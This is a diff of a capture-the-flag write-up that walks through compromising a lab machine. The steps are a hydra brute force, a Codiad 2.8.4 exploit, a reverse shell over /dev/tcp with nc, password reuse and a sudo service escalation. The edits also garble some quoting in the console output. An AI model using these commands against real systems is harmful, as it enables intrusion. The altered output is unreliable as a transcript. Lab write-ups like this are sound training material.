@@ -61,11 +61,11 @@ Also, please take care of the image file ;)
 
 {{text("We found 2 usernames, <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>john</code> and <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>drac</code>. The note also informs us about a password change to the default one, meaning it should be easy to guess.")}}
 
-{{header}}
+{{header("Shell as www-data", "shell-as-www-data")}}
 
 {{text("We proceed to the web page on port 62337, probably looking for some kind of login form.")}}
 
-{{image("../../static/writeups/hackervshacker/images/000001.jpg")}}
+{{image("../../static/writeups/ide/images/000001.jpg")}}
 
 {{text("It's probably possible for us to guess user's <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>john</code> password, but let's use <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>hydra</code> to brute-force it.")}}
 
@@ -80,7 +80,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-17 09:10:
 
 {{text("Knowing the password, we can log in.")}}
 
-{{image("../../static/writeups/hackervshacker/images/000002.jpg")}}
+{{image("../../static/writeups/ide/images/000002.jpg")}}
 
 {{text("Now we can search for any known exploits for <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Codiad 2.8.4</code>.")}}
 
@@ -91,40 +91,40 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-17 09:10:
 {{text("Let's copy the exploit onto our machine and run it.")}}
 
 {{console("python3 exploit.py http://10.10.192.150:62337/ john password 10.9.1.157 1234 linux", "[+] Please execute the following command on your vps: 
-echo 'bash -c "bash -i >/dev/tcp/10.9.1.157/1235 0>&1 2>&1"' | nc -lnvp 1234
+echo 'bash -c 'bash -i >/dev/tcp/10.9.1.157/1235 0>&1 2>&1'' | nc -lnvp 1234
 nc -lnvp 1235
 [+] Please confirm that you have done the two command above [y/n]
 [Y/n] Y
 [+] Starting...
-[+] Login Content : {"status":"success","data":{"username":"john"}}
+[+] Login Content : {'status':'success','data':{'username':'john'}}
 [+] Login success!
 [+] Getting writeable path...
-[+] Path Content : {"status":"success","data":{"name":"CloudCall","path":"\/var\/www\/html\/codiad_projects"}}
+[+] Path Content : {'status':'success','data':{'name':'CloudCall','path':'\/var\/www\/html\/codiad_projects'}}
 [+] Writeable Path : /var/www/html/codiad_projects
 [+] Sending payload...
-{"status":"error","message":"No Results Returned"}
+{'status','error','message':'No Results Returned'}
 [+] Exploit finished!
 [+] Enjoy your reverse shell!")}}
 
 {{text("Now we have a reverse shell on the target.")}}
 
-{{image("../../static/writeups/hackervshacker/images/000003.jpg")}}
+{{image("../../static/writeups/ide/images/000003.jpg")}}
 
-{{header}}
+{{header("Shell as drac", "shell-as-drac")}}
 
 {{text("While looking through the system, I accessed user's <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>drac</code> home directory.")}}
 
 {{text("There was a flag, which I couldn't read and a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>.bash_history</code> file which contents were not getting deleted.")}}
 
-{{image("../../static/writeups/hackervshacker/images/000004.jpg")}}
+{{image("../../static/writeups/ide/images/000004.jpg")}}
 
 {{text("We got a password to MySQL database, I wondered if this user reused his passwords and I tried to log in as him.")}}
 
-{{image("../../static/writeups/hackervshacker/images/000005.jpg")}}
+{{image("../../static/writeups/ide/images/000005.jpg")}}
 
 {{text("Seems like my theory was right.")}}
 
-{{header}}
+{{header("Shell as root", "shell-as-root")}}
 
 {{text("Since I had my current user's password, I checked his sudo privilages.")}}
 
@@ -159,6 +159,8 @@ WantedBy=multi-user.target")}}
 
 {{text("We follow the instructions and execute the command provided.")}}
 
-{{text("Now when we run the sudo command again, we should get a reverse shell.")}}
+{{text("Now when we run the sudo command again, we should get a reverse shell and be able to read the last flag.")}}
 
-{{image("../../static/writeups/hackervshacker/images/000006.jpg")}}
+{{image("../../static/writeups/ide/images/000006.jpg")}}
+
+{{script()}}
